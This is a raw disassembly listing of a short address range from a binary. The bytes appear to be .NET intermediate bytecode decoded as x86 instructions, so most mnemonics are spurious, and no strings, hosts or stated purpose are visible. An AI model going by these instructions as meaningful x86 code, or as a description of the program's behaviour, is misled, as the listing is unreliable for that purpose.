  405f03:	00 7c ab 00          	add    %bh,0x0(%ebx,%ebp,4)
  405f07:	00 04 28             	add    %al,(%eax,%ebp,1)
  405f0a:	d0 00                	rolb   $1,(%eax)
  405f0c:	00 0a                	add    %cl,(%edx)
  405f0e:	2a 00                	sub    (%eax),%al
  405f10:	1b 30                	sbb    (%eax),%esi
  405f12:	03 00                	add    (%eax),%eax
  405f14:	79 00                	jns    0x405f16
  405f16:	00 00                	add    %al,(%eax)
  405f18:	2f                   	das
  405f19:	00 00                	add    %al,(%eax)
  405f1b:	11 7e d1             	adc    %edi,-0x2f(%esi)
  405f1e:	00 00                	add    %al,(%eax)
  405f20:	0a 0a                	or     (%edx),%cl
  405f22:	28 68 00             	sub    %ch,0x0(%eax)
  405f25:	00 06                	add    %al,(%esi)
  405f27:	0b 07                	or     (%edi),%eax
  405f29:	28 6a 00             	sub    %ch,0x0(%edx)
  405f2c:	00 06                	add    %al,(%esi)
  405f2e:	17                   	pop    %ss
  405f2f:	58                   	pop    %eax
  405f30:	0c 08                	or     $0x8,%al
  405f32:	73 d2                	jae    0x405f06
  405f34:	00 00                	add    %al,(%eax)
  405f36:	0a 0d 07 09 08 28    	or     0x28080907,%cl
  405f3c:	69 00 00 06 16 31    	imul   $0x31160600,(%eax),%eax
  405f42:	07                   	pop    %es
  405f43:	09 6f 63             	or     %ebp,0x63(%edi)
  405f46:	00 00                	add    %al,(%eax)
  405f48:	0a 0a                	or     (%edx),%cl
  405f4a:	00 07                	add    %al,(%edi)
  405f4c:	12 04 28             	adc    (%eax,%ebp,1),%al
  405f4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  405f52:	06                   	push   %es
  405f53:	26 11 04 28          	adc    %eax,%es:(%eax,%ebp,1)
  405f57:	d3 00                	roll   %cl,(%eax)
  405f59:	00 0a                	add    %cl,(%edx)
  405f5b:	13 05 06 72 06 0e    	adc    0xe067206,%eax
  405f61:	00 70 28             	add    %dh,0x28(%eax)
  405f64:	21 00                	and    %eax,(%eax)
  405f66:	00 0a                	add    %cl,(%edx)
  405f68:	2c 0a                	sub    $0xa,%al
  405f6a:	11 05 6f d4 00 00    	adc    %eax,0xd46f
  405f70:	0a 0a                	or     (%edx),%cl
  405f72:	2b 13                	sub    (%ebx),%edx
  405f74:	11 05 6f d4 00 00    	adc    %eax,0xd46f
  405f7a:	0a 72 08             	or     0x8(%edx),%dh
  405f7d:	0e                   	push   %cs
  405f7e:	00 70 06             	add    %dh,0x6(%eax)
  405f81:	28 6b 00             	sub    %ch,0x0(%ebx)
  405f84:	00 0a                	add    %cl,(%edx)
  405f86:	0a 11                	or     (%ecx),%dl
  405f88:	05 6f d5 00 00       	add    $0xd56f,%eax
  405f8d:	0a de                	or     %dh,%bl
  405f8f:	03 26                	add    (%esi),%esp
  405f91:	de 00                	fiadds (%eax)
  405f93:	06                   	push   %es
  405f94:	2a 00                	sub    (%eax),%al
  405f96:	00 00                	add    %al,(%eax)
  405f98:	01 10                	add    %edx,(%eax)
  405f9a:	00 00                	add    %al,(%eax)
  405f9c:	00 00                	add    %al,(%eax)
  405f9e:	2f                   	das
  405f9f:	00 45 74             	add    %al,0x74(%ebp)
  405fa2:	00 03                	add    %al,(%ebx)
  405fa4:	01 00                	add    %eax,(%eax)
  405fa6:	00 01                	add    %al,(%ecx)
  405fa8:	1b 30                	sbb    (%eax),%esi
  405faa:	01 00                	add    %eax,(%eax)
  405fac:	0f 00 00             	sldt   (%eax)
  405faf:	00 17                	add    %dl,(%edi)
  405fb1:	00 00                	add    %al,(%eax)
  405fb3:	11 16                	adc    %edx,(%esi)
  405fb5:	0a 28                	or     (%eax),%ch
  405fb7:	67 00 00             	add    %al,(%bx,%si)
  405fba:	06                   	push   %es
  405fbb:	0a de                	or     %dh,%bl
  405fbd:	03 26                	add    (%esi),%esp
  405fbf:	de 00                	fiadds (%eax)
  405fc1:	06                   	push   %es
  405fc2:	2a 00                	sub    (%eax),%al
  405fc4:	01 10                	add    %edx,(%eax)
  405fc6:	00 00                	add    %al,(%eax)
  405fc8:	00 00                	add    %al,(%eax)
  405fca:	02 00                	add    (%eax),%al
  405fcc:	08 0a                	or     %cl,(%edx)
  405fce:	00 03                	add    %al,(%ebx)
  405fd0:	01 00                	add    %eax,(%eax)
  405fd2:	00 01                	add    %al,(%ecx)
  405fd4:	1b 30                	sbb    (%eax),%esi
  405fd6:	03 00                	add    (%eax),%eax
  405fd8:	c7 00 00 00 30 00    	movl   $0x300000,(%eax)
  405fde:	00 11                	add    %dl,(%ecx)
  405fe0:	73 d6                	jae    0x405fb8
  405fe2:	00 00                	add    %al,(%eax)
  405fe4:	0a 0a                	or     (%edx),%cl
  405fe6:	72 10                	jb     0x405ff8
  405fe8:	0e                   	push   %cs
  405fe9:	00 70 28             	add    %dh,0x28(%eax)
  405fec:	d7                   	xlat   %ds:(%ebx)
  405fed:	00 00                	add    %al,(%eax)
  405fef:	0a 72 16             	or     0x16(%edx),%dh
  405ff2:	0e                   	push   %cs
  405ff3:	00 70 28             	add    %dh,0x28(%eax)
  405ff6:	6b 00 00             	imul   $0x0,(%eax),%eax
  405ff9:	0a 72 42             	or     0x42(%edx),%dh
  405ffc:	0e                   	push   %cs
  405ffd:	00 70 73             	add    %dh,0x73(%eax)
  406000:	d8 00                	fadds  (%eax)
  406002:	00 0a                	add    %cl,(%edx)
  406004:	0b 07                	or     (%edi),%eax
  406006:	6f                   	outsl  %ds:(%esi),(%dx)
  406007:	d9 00                	flds   (%eax)
  406009:	00 0a                	add    %cl,(%edx)
  40600b:	6f                   	outsl  %ds:(%esi),(%dx)
  40600c:	da 00                	fiaddl (%eax)
  40600e:	00 0a                	add    %cl,(%edx)
  406010:	0c 2b                	or     $0x2b,%al
  406012:	2c 08                	sub    $0x8,%al
  406014:	6f                   	outsl  %ds:(%esi),(%dx)
  406015:	db 00                	fildl  (%eax)
  406017:	00 0a                	add    %cl,(%edx)
  406019:	25 72 80 0e 00       	and    $0xe8072,%eax
  40601e:	70 6f                	jo     0x40608f
  406020:	dc 00                	faddl  (%eax)
  406022:	00 0a                	add    %cl,(%edx)
  406024:	6f                   	outsl  %ds:(%esi),(%dx)
  406025:	63 00                	arpl   %eax,(%eax)
  406027:	00 0a                	add    %cl,(%edx)
  406029:	0d 06 09 6f dd       	or     $0xdd6f0906,%eax
  40602e:	00 00                	add    %al,(%eax)
  406030:	0a 2d 07 06 09 6f    	or     0x6f090607,%ch
  406036:	de 00                	fiadds (%eax)
  406038:	00 0a                	add    %cl,(%edx)
  40603a:	6f                   	outsl  %ds:(%esi),(%dx)
  40603b:	df 00                	filds  (%eax)
  40603d:	00 0a                	add    %cl,(%edx)
  40603f:	08 6f e0             	or     %ch,-0x20(%edi)
  406042:	00 00                	add    %al,(%eax)
  406044:	0a 2d cc de 0a 08    	or     0x80adecc,%ch
  40604a:	2c 06                	sub    $0x6,%al
  40604c:	08 6f 4b             	or     %ch,0x4b(%edi)
  40604f:	00 00                	add    %al,(%eax)
  406051:	0a dc                	or     %ah,%bl
  406053:	06                   	push   %es
  406054:	6f                   	outsl  %ds:(%esi),(%dx)
  406055:	e1 00                	loope  0x406057
  406057:	00 0a                	add    %cl,(%edx)
  406059:	2d 0b 06 72 98       	sub    $0x9872060b,%eax
  40605e:	0e                   	push   %cs
  40605f:	00 70 6f             	add    %dh,0x6f(%eax)
  406062:	de 00                	fiadds (%eax)
  406064:	00 0a                	add    %cl,(%edx)
  406066:	de 0a                	fimuls (%edx)
  406068:	07                   	pop    %es
  406069:	2c 06                	sub    $0x6,%al
  40606b:	07                   	pop    %es
  40606c:	6f                   	outsl  %ds:(%esi),(%dx)
  40606d:	4b                   	dec    %ebx
  40606e:	00 00                	add    %al,(%eax)
  406070:	0a dc                	or     %ah,%bl
  406072:	72 a0                	jb     0x406014
  406074:	0e                   	push   %cs
  406075:	00 70 06             	add    %dh,0x6(%eax)
  406078:	28 5e 00             	sub    %bl,0x0(%esi)
  40607b:	00 0a                	add    %cl,(%edx)
  40607d:	13 04 de             	adc    (%esi,%ebx,8),%eax
  406080:	23 26                	and    (%esi),%esp
  406082:	06                   	push   %es
  406083:	6f                   	outsl  %ds:(%esi),(%dx)
  406084:	e1 00                	loope  0x406086
  406086:	00 0a                	add    %cl,(%edx)
  406088:	2d 0b 06 72 98       	sub    $0x9872060b,%eax
  40608d:	0e                   	push   %cs
  40608e:	00 70 6f             	add    %dh,0x6f(%eax)
  406091:	de 00                	fiadds (%eax)
  406093:	00 0a                	add    %cl,(%edx)
  406095:	72 a0                	jb     0x406037
  406097:	0e                   	push   %cs
  406098:	00 70 06             	add    %dh,0x6(%eax)
  40609b:	28 5e 00             	sub    %bl,0x0(%esi)
  40609e:	00 0a                	add    %cl,(%edx)
  4060a0:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4060a3:	00 11                	add    %dl,(%ecx)
  4060a5:	04 2a                	add    $0x2a,%al
  4060a7:	00 01                	add    %al,(%ecx)
  4060a9:	28 00                	sub    %al,(%eax)
  4060ab:	00 02                	add    %al,(%edx)
  4060ad:	00 31                	add    %dh,(%ecx)
  4060af:	00 38                	add    %bh,(%eax)
  4060b1:	69 00 0a 00 00 00    	imul   $0xa,(%eax),%eax
  4060b7:	00 02                	add    %al,(%edx)
  4060b9:	00 25 00 63 88 00    	add    %ah,0x886300
  4060bf:	0a 00                	or     (%eax),%al
  4060c1:	00 00                	add    %al,(%eax)
  4060c3:	00 00                	add    %al,(%eax)
  4060c5:	00 06                	add    %al,(%esi)
  4060c7:	00 9b a1 00 23 01    	add    %bl,0x12300a1(%ebx)
  4060cd:	00 00                	add    %al,(%eax)
  4060cf:	01 1b                	add    %ebx,(%ebx)
  4060d1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4060d4:	86 00                	xchg   %al,(%eax)
  4060d6:	00 00                	add    %al,(%eax)
  4060d8:	31 00                	xor    %eax,(%eax)
  4060da:	00 11                	add    %dl,(%ecx)
  4060dc:	72 06                	jb     0x4060e4
  4060de:	0e                   	push   %cs
  4060df:	00 70 0a             	add    %dh,0xa(%eax)
  4060e2:	72 a6                	jb     0x40608a
  4060e4:	0e                   	push   %cs
  4060e5:	00 70 73             	add    %dh,0x73(%eax)
  4060e8:	e2 00                	loop   0x4060ea
  4060ea:	00 0a                	add    %cl,(%edx)
  4060ec:	0b 07                	or     (%edi),%eax
  4060ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ef:	d9 00                	flds   (%eax)
  4060f1:	00 0a                	add    %cl,(%edx)
  4060f3:	0c 08                	or     $0x8,%al
  4060f5:	2c 5d                	sub    $0x5d,%al
  4060f7:	08 6f da             	or     %ch,-0x26(%edi)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	0a 0d 2b 3a 09 6f    	or     0x6f093a2b,%cl
  406102:	db 00                	fildl  (%eax)
  406104:	00 0a                	add    %cl,(%edx)
  406106:	74 68                	je     0x406170
  406108:	00 00                	add    %al,(%eax)
  40610a:	01 13                	add    %edx,(%ebx)
  40610c:	04 11                	add    $0x11,%al
  40610e:	04 72                	add    $0x72,%al
  406110:	ee                   	out    %al,(%dx)
  406111:	0e                   	push   %cs
  406112:	00 70 6f             	add    %dh,0x6f(%eax)
  406115:	e3 00                	jecxz  0x406117
  406117:	00 0a                	add    %cl,(%edx)
  406119:	6f                   	outsl  %ds:(%esi),(%dx)
  40611a:	63 00                	arpl   %eax,(%eax)
  40611c:	00 0a                	add    %cl,(%edx)
  40611e:	72 08                	jb     0x406128
  406120:	0e                   	push   %cs
  406121:	00 70 11             	add    %dh,0x11(%eax)
  406124:	04 72                	add    $0x72,%al
  406126:	fe 0e                	decb   (%esi)
  406128:	00 70 6f             	add    %dh,0x6f(%eax)
  40612b:	e3 00                	jecxz  0x40612d
  40612d:	00 0a                	add    %cl,(%edx)
  40612f:	6f                   	outsl  %ds:(%esi),(%dx)
  406130:	63 00                	arpl   %eax,(%eax)
  406132:	00 0a                	add    %cl,(%edx)
  406134:	28 6b 00             	sub    %ch,0x0(%ebx)
  406137:	00 0a                	add    %cl,(%edx)
  406139:	0a 09                	or     (%ecx),%cl
  40613b:	6f                   	outsl  %ds:(%esi),(%dx)
  40613c:	e0 00                	loopne 0x40613e
  40613e:	00 0a                	add    %cl,(%edx)
  406140:	2d be de 0a 09       	sub    $0x90adebe,%eax
  406145:	2c 06                	sub    $0x6,%al
  406147:	09 6f 4b             	or     %ebp,0x4b(%edi)
  40614a:	00 00                	add    %al,(%eax)
  40614c:	0a dc                	or     %ah,%bl
  40614e:	08 6f e4             	or     %ch,-0x1c(%edi)
  406151:	00 00                	add    %al,(%eax)
  406153:	0a de                	or     %dh,%bl
  406155:	0a 07                	or     (%edi),%al
  406157:	2c 06                	sub    $0x6,%al
  406159:	07                   	pop    %es
  40615a:	6f                   	outsl  %ds:(%esi),(%dx)
  40615b:	4b                   	dec    %ebx
  40615c:	00 00                	add    %al,(%eax)
  40615e:	0a dc                	or     %ah,%bl
  406160:	06                   	push   %es
  406161:	2a 00                	sub    (%eax),%al
  406163:	00 01                	add    %al,(%ecx)
  406165:	1c 00                	sbb    $0x0,%al
  406167:	00 02                	add    %al,(%edx)
  406169:	00 22                	add    %ah,(%edx)
  40616b:	00 46 68             	add    %al,0x68(%esi)
  40616e:	00 0a                	add    %cl,(%edx)
  406170:	00 00                	add    %al,(%eax)
  406172:	00 00                	add    %al,(%eax)
  406174:	02 00                	add    (%eax),%al
  406176:	11 00                	adc    %eax,(%eax)
  406178:	69 7a 00 0a 00 00 00 	imul   $0xa,0x0(%edx),%edi
  40617f:	00 1b                	add    %bl,(%ebx)
  406181:	30 04 00             	xor    %al,(%eax,%eax,1)
  406184:	5f                   	pop    %edi
  406185:	00 00                	add    %al,(%eax)
  406187:	00 32                	add    %dh,(%edx)
  406189:	00 00                	add    %al,(%eax)
  40618b:	11 1b                	adc    %ebx,(%ebx)
  40618d:	8d 01                	lea    (%ecx),%eax
  40618f:	00 00                	add    %al,(%eax)
  406191:	01 25 16 28 e5 00    	add    %esp,0xe52816
  406197:	00 0a                	add    %cl,(%edx)
  406199:	8c 69 00             	mov    %gs,0x0(%ecx)
  40619c:	00 01                	add    %al,(%ecx)
  40619e:	a2 25 17 28 53       	mov    %al,0x53281725
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	0a a2 25 18 28 d7    	or     -0x28d7e7db(%edx),%ah
  4061ab:	00 00                	add    %al,(%eax)
  4061ad:	0a a2 25 19 28 e6    	or     -0x19d7e6db(%edx),%ah
  4061b3:	00 00                	add    %al,(%eax)
  4061b5:	0a a2 25 1a 28 e7    	or     -0x18d7e5db(%edx),%ah
  4061bb:	00 00                	add    %al,(%eax)
  4061bd:	0a 28                	or     (%eax),%ch
  4061bf:	e8 00 00 0a 73       	call   0x734a61c4
  4061c4:	e9 00 00 0a 28       	jmp    0x284a61c9
  4061c9:	ea 00 00 0a 8c 6c 00 	ljmp   $0x6c,$0x8c0a0000
  4061d0:	00 01                	add    %al,(%ecx)
  4061d2:	a2 28 eb 00 00       	mov    %al,0xeb28
  4061d7:	0a 28                	or     (%eax),%ch
  4061d9:	74 00                	je     0x4061db
  4061db:	00 06                	add    %al,(%esi)
  4061dd:	0a de                	or     %dh,%bl
  4061df:	09 26                	or     %esp,(%esi)
  4061e1:	72 1c                	jb     0x4061ff
  4061e3:	0f 00                	(bad)
  4061e5:	70 0a                	jo     0x4061f1
  4061e7:	de 00                	fiadds (%eax)
  4061e9:	06                   	push   %es
  4061ea:	2a 00                	sub    (%eax),%al
  4061ec:	01 10                	add    %edx,(%eax)
  4061ee:	00 00                	add    %al,(%eax)
  4061f0:	00 00                	add    %al,(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	54                   	push   %esp
  4061f5:	54                   	push   %esp
  4061f6:	00 09                	add    %cl,(%ecx)
  4061f8:	01 00                	add    %eax,(%eax)
  4061fa:	00 01                	add    %al,(%ecx)
  4061fc:	13 30                	adc    (%eax),%esi
  4061fe:	03 00                	add    (%eax),%eax
  406200:	5a                   	pop    %edx
  406201:	00 00                	add    %al,(%eax)
  406203:	00 33                	add    %dh,(%ebx)
  406205:	00 00                	add    %al,(%eax)
  406207:	11 73 ec             	adc    %esi,-0x14(%ebx)
  40620a:	00 00                	add    %al,(%eax)
  40620c:	0a 28                	or     (%eax),%ch
  40620e:	ed                   	in     (%dx),%eax
  40620f:	00 00                	add    %al,(%eax)
  406211:	0a 02                	or     (%edx),%al
  406213:	6f                   	outsl  %ds:(%esi),(%dx)
  406214:	3b 00                	cmp    (%eax),%eax
  406216:	00 0a                	add    %cl,(%edx)
  406218:	0a 06                	or     (%esi),%al
  40621a:	6f                   	outsl  %ds:(%esi),(%dx)
  40621b:	ee                   	out    %al,(%dx)
  40621c:	00 00                	add    %al,(%eax)
  40621e:	0a 0a                	or     (%edx),%cl
  406220:	73 b8                	jae    0x4061da
  406222:	00 00                	add    %al,(%eax)
  406224:	0a 0b                	or     (%ebx),%cl
  406226:	06                   	push   %es
  406227:	0c 16                	or     $0x16,%al
  406229:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  40622e:	91                   	xchg   %eax,%ecx
  40622f:	13 04 07             	adc    (%edi,%eax,1),%eax
  406232:	12 04 72             	adc    (%edx,%esi,2),%al
  406235:	2c 0f                	sub    $0xf,%al
  406237:	00 70 28             	add    %dh,0x28(%eax)
  40623a:	ef                   	out    %eax,(%dx)
  40623b:	00 00                	add    %al,(%eax)
  40623d:	0a 6f f0             	or     -0x10(%edi),%ch
  406240:	00 00                	add    %al,(%eax)
  406242:	0a 26                	or     (%esi),%ah
  406244:	09 17                	or     %edx,(%edi)
  406246:	58                   	pop    %eax
  406247:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  40624c:	32 de                	xor    %dh,%bl
  40624e:	07                   	pop    %es
  40624f:	6f                   	outsl  %ds:(%esi),(%dx)
  406250:	63 00                	arpl   %eax,(%eax)
  406252:	00 0a                	add    %cl,(%edx)
  406254:	16                   	push   %ss
  406255:	1f                   	pop    %ds
  406256:	14 6f                	adc    $0x6f,%al
  406258:	f1                   	int1
  406259:	00 00                	add    %al,(%eax)
  40625b:	0a 6f f2             	or     -0xe(%edi),%ch
  40625e:	00 00                	add    %al,(%eax)
  406260:	0a 2a                	or     (%edx),%ch
  406262:	00 00                	add    %al,(%eax)
  406264:	13 30                	adc    (%eax),%esi
  406266:	02 00                	add    (%eax),%al
  406268:	58                   	pop    %eax
  406269:	00 00                	add    %al,(%eax)
  40626b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40626e:	00 11                	add    %dl,(%ecx)
  406270:	12 00                	adc    (%eax),%al
  406272:	28 70 00             	sub    %dh,0x0(%eax)
  406275:	00 0a                	add    %cl,(%edx)
  406277:	7d ae                	jge    0x406227
  406279:	00 00                	add    %al,(%eax)
  40627b:	04 12                	add    $0x12,%al
  40627d:	00 02                	add    %al,(%edx)
  40627f:	7d af                	jge    0x406230
  406281:	00 00                	add    %al,(%eax)
  406283:	04 12                	add    $0x12,%al
  406285:	00 03                	add    %al,(%ebx)
  406287:	7d b0                	jge    0x406239
  406289:	00 00                	add    %al,(%eax)
  40628b:	04 12                	add    $0x12,%al
  40628d:	00 04 7d b2 00 00 04 	add    %al,0x40000b2(,%edi,2)
  406294:	12 00                	adc    (%eax),%al
  406296:	05 7d b3 00 00       	add    $0xb37d,%eax
  40629b:	04 12                	add    $0x12,%al
  40629d:	00 0e                	add    %cl,(%esi)
  40629f:	04 7d                	add    $0x7d,%al
  4062a1:	b1 00                	mov    $0x0,%cl
  4062a3:	00 04 12             	add    %al,(%edx,%edx,1)
  4062a6:	00 15 7d ad 00 00    	add    %dl,0xad7d
  4062ac:	04 12                	add    $0x12,%al
  4062ae:	00 7c ae 00          	add    %bh,0x0(%esi,%ebp,4)
  4062b2:	00 04 12             	add    %al,(%edx,%edx,1)
  4062b5:	00 28                	add    %ch,(%eax)
  4062b7:	3e 00 00             	add    %al,%ds:(%eax)
  4062ba:	2b 12                	sub    (%edx),%edx
  4062bc:	00 7c ae 00          	add    %bh,0x0(%esi,%ebp,4)
  4062c0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4062c3:	72 00                	jb     0x4062c5
  4062c5:	00 0a                	add    %cl,(%edx)
  4062c7:	2a 13                	sub    (%ebx),%dl
  4062c9:	30 02                	xor    %al,(%edx)
  4062cb:	00 37                	add    %dh,(%edi)
  4062cd:	00 00                	add    %al,(%eax)
  4062cf:	00 35 00 00 11 12    	add    %dh,0x12110000
  4062d5:	00 28                	add    %ch,(%eax)
  4062d7:	1b 00                	sbb    (%eax),%eax
  4062d9:	00 0a                	add    %cl,(%edx)
  4062db:	7d b8                	jge    0x406295
  4062dd:	00 00                	add    %al,(%eax)
  4062df:	04 12                	add    $0x12,%al
  4062e1:	00 02                	add    %al,(%edx)
  4062e3:	7d b9                	jge    0x40629e
  4062e5:	00 00                	add    %al,(%eax)
  4062e7:	04 12                	add    $0x12,%al
  4062e9:	00 15 7d b7 00 00    	add    %dl,0xb77d
  4062ef:	04 12                	add    $0x12,%al
  4062f1:	00 7c b8 00          	add    %bh,0x0(%eax,%edi,4)
  4062f5:	00 04 12             	add    %al,(%edx,%edx,1)
  4062f8:	00 28                	add    %ch,(%eax)
  4062fa:	3f                   	aas
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	2b 12                	sub    (%edx),%edx
  4062ff:	00 7c b8 00          	add    %bh,0x0(%eax,%edi,4)
  406303:	00 04 28             	add    %al,(%eax,%ebp,1)
  406306:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40630b:	00 13                	add    %dl,(%ebx)
  40630d:	30 02                	xor    %al,(%edx)
  40630f:	00 2f                	add    %ch,(%edi)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 36                	add    %dh,(%esi)
  406315:	00 00                	add    %al,(%eax)
  406317:	11 12                	adc    %edx,(%edx)
  406319:	00 28                	add    %ch,(%eax)
  40631b:	1b 00                	sbb    (%eax),%eax
  40631d:	00 0a                	add    %cl,(%edx)
  40631f:	7d bc                	jge    0x4062dd
  406321:	00 00                	add    %al,(%eax)
  406323:	04 12                	add    $0x12,%al
  406325:	00 15 7d bb 00 00    	add    %dl,0xbb7d
  40632b:	04 12                	add    $0x12,%al
  40632d:	00 7c bc 00          	add    %bh,0x0(%esp,%edi,4)
  406331:	00 04 12             	add    %al,(%edx,%edx,1)
  406334:	00 28                	add    %ch,(%eax)
  406336:	40                   	inc    %eax
  406337:	00 00                	add    %al,(%eax)
  406339:	2b 12                	sub    (%edx),%edx
  40633b:	00 7c bc 00          	add    %bh,0x0(%esp,%edi,4)
  40633f:	00 04 28             	add    %al,(%eax,%ebp,1)
  406342:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  406347:	00 13                	add    %dl,(%ebx)
  406349:	30 02                	xor    %al,(%edx)
  40634b:	00 3f                	add    %bh,(%edi)
  40634d:	00 00                	add    %al,(%eax)
  40634f:	00 37                	add    %dh,(%edi)
  406351:	00 00                	add    %al,(%eax)
  406353:	11 12                	adc    %edx,(%edx)
  406355:	00 28                	add    %ch,(%eax)
  406357:	77 00                	ja     0x406359
  406359:	00 0a                	add    %cl,(%edx)
  40635b:	7d c1                	jge    0x40631e
  40635d:	00 00                	add    %al,(%eax)
  40635f:	04 12                	add    $0x12,%al
  406361:	00 02                	add    %al,(%edx)
  406363:	7d c3                	jge    0x406328
  406365:	00 00                	add    %al,(%eax)
  406367:	04 12                	add    $0x12,%al
  406369:	00 03                	add    %al,(%ebx)
  40636b:	7d c2                	jge    0x40632f
  40636d:	00 00                	add    %al,(%eax)
  40636f:	04 12                	add    $0x12,%al
  406371:	00 15 7d c0 00 00    	add    %dl,0xc07d
  406377:	04 12                	add    $0x12,%al
  406379:	00 7c c1 00          	add    %bh,0x0(%ecx,%eax,8)
  40637d:	00 04 12             	add    %al,(%edx,%edx,1)
  406380:	00 28                	add    %ch,(%eax)
  406382:	41                   	inc    %ecx
  406383:	00 00                	add    %al,(%eax)
  406385:	2b 12                	sub    (%edx),%edx
  406387:	00 7c c1 00          	add    %bh,0x0(%ecx,%eax,8)
  40638b:	00 04 28             	add    %al,(%eax,%ebp,1)
  40638e:	79 00                	jns    0x406390
  406390:	00 0a                	add    %cl,(%edx)
  406392:	2a 00                	sub    (%eax),%al
  406394:	13 30                	adc    (%eax),%esi
  406396:	02 00                	add    (%eax),%al
  406398:	3f                   	aas
  406399:	00 00                	add    %al,(%eax)
  40639b:	00 38                	add    %bh,(%eax)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	11 12                	adc    %edx,(%edx)
  4063a1:	00 28                	add    %ch,(%eax)
  4063a3:	77 00                	ja     0x4063a5
  4063a5:	00 0a                	add    %cl,(%edx)
  4063a7:	7d c6                	jge    0x40636f
  4063a9:	00 00                	add    %al,(%eax)
  4063ab:	04 12                	add    $0x12,%al
  4063ad:	00 02                	add    %al,(%edx)
  4063af:	7d c7                	jge    0x406378
  4063b1:	00 00                	add    %al,(%eax)
  4063b3:	04 12                	add    $0x12,%al
  4063b5:	00 03                	add    %al,(%ebx)
  4063b7:	7d c8                	jge    0x406381
  4063b9:	00 00                	add    %al,(%eax)
  4063bb:	04 12                	add    $0x12,%al
  4063bd:	00 15 7d c5 00 00    	add    %dl,0xc57d
  4063c3:	04 12                	add    $0x12,%al
  4063c5:	00 7c c6 00          	add    %bh,0x0(%esi,%eax,8)
  4063c9:	00 04 12             	add    %al,(%edx,%edx,1)
  4063cc:	00 28                	add    %ch,(%eax)
  4063ce:	42                   	inc    %edx
  4063cf:	00 00                	add    %al,(%eax)
  4063d1:	2b 12                	sub    (%edx),%edx
  4063d3:	00 7c c6 00          	add    %bh,0x0(%esi,%eax,8)
  4063d7:	00 04 28             	add    %al,(%eax,%ebp,1)
  4063da:	79 00                	jns    0x4063dc
  4063dc:	00 0a                	add    %cl,(%edx)
  4063de:	2a 00                	sub    (%eax),%al
  4063e0:	13 30                	adc    (%eax),%esi
  4063e2:	02 00                	add    (%eax),%al
  4063e4:	2f                   	das
  4063e5:	00 00                	add    %al,(%eax)
  4063e7:	00 39                	add    %bh,(%ecx)
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	11 12                	adc    %edx,(%edx)
  4063ed:	00 28                	add    %ch,(%eax)
  4063ef:	f3 00 00             	repz add %al,(%eax)
  4063f2:	0a 7d cd             	or     -0x33(%ebp),%bh
  4063f5:	00 00                	add    %al,(%eax)
  4063f7:	04 12                	add    $0x12,%al
  4063f9:	00 15 7d cc 00 00    	add    %dl,0xcc7d
  4063ff:	04 12                	add    $0x12,%al
  406401:	00 7c cd 00          	add    %bh,0x0(%ebp,%ecx,8)
  406405:	00 04 12             	add    %al,(%edx,%edx,1)
  406408:	00 28                	add    %ch,(%eax)
  40640a:	43                   	inc    %ebx
  40640b:	00 00                	add    %al,(%eax)
  40640d:	2b 12                	sub    (%edx),%edx
  40640f:	00 7c cd 00          	add    %bh,0x0(%ebp,%ecx,8)
  406413:	00 04 28             	add    %al,(%eax,%ebp,1)
  406416:	f5                   	cmc
  406417:	00 00                	add    %al,(%eax)
  406419:	0a 2a                	or     (%edx),%ch
  40641b:	00 13                	add    %dl,(%ebx)
  40641d:	30 02                	xor    %al,(%edx)
  40641f:	00 2a                	add    %ch,(%edx)
  406421:	00 00                	add    %al,(%eax)
  406423:	00 3a                	add    %bh,(%edx)
  406425:	00 00                	add    %al,(%eax)
  406427:	11 12                	adc    %edx,(%edx)
  406429:	00 fe                	add    %bh,%dh
  40642b:	15 20 00 00 02       	adc    $0x2000020,%eax
  406430:	12 00                	adc    (%eax),%al
  406432:	06                   	push   %es
  406433:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  406437:	2b 7d a5             	sub    -0x5b(%ebp),%edi
  40643a:	00 00                	add    %al,(%eax)
  40643c:	04 12                	add    $0x12,%al
  40643e:	00 28                	add    %ch,(%eax)
  406440:	6c                   	insb   (%dx),%es:(%edi)
  406441:	00 00                	add    %al,(%eax)
  406443:	06                   	push   %es
  406444:	26 28 f7             	es sub %dh,%bh
  406447:	00 00                	add    %al,(%eax)
  406449:	0a 06                	or     (%esi),%al
  40644b:	7b a6                	jnp    0x4063f3
  40644d:	00 00                	add    %al,(%eax)
  40644f:	04 59                	add    $0x59,%al
  406451:	2a 00                	sub    (%eax),%al
  406453:	00 1b                	add    %bl,(%ebx)
  406455:	30 03                	xor    %al,(%ebx)
  406457:	00 af 00 00 00 3b    	add    %ch,0x3b000000(%edi)
  40645d:	00 00                	add    %al,(%eax)
  40645f:	11 02                	adc    %eax,(%edx)
  406461:	7b aa                	jnp    0x40640d
  406463:	00 00                	add    %al,(%eax)
  406465:	04 0a                	add    $0xa,%al
  406467:	06                   	push   %es
  406468:	2c 53                	sub    $0x53,%al
  40646a:	7e a8                	jle    0x406414
  40646c:	00 00                	add    %al,(%eax)
  40646e:	04 25                	add    $0x25,%al
  406470:	2d 17 26 7e a7       	sub    $0xa77e2617,%eax
  406475:	00 00                	add    %al,(%eax)
  406477:	04 fe                	add    $0xfe,%al
  406479:	06                   	push   %es
  40647a:	7f 00                	jg     0x40647c
  40647c:	00 06                	add    %al,(%esi)
  40647e:	73 f8                	jae    0x406478
  406480:	00 00                	add    %al,(%eax)
  406482:	0a 25 80 a8 00 00    	or     0xa880,%ah
  406488:	04 28                	add    $0x28,%al
  40648a:	45                   	inc    %ebp
  40648b:	00 00                	add    %al,(%eax)
  40648d:	2b 6f 64             	sub    0x64(%edi),%ebp
  406490:	00 00                	add    %al,(%eax)
  406492:	0a 0c 12             	or     (%edx,%edx,1),%cl
  406495:	02 28                	add    (%eax),%ch
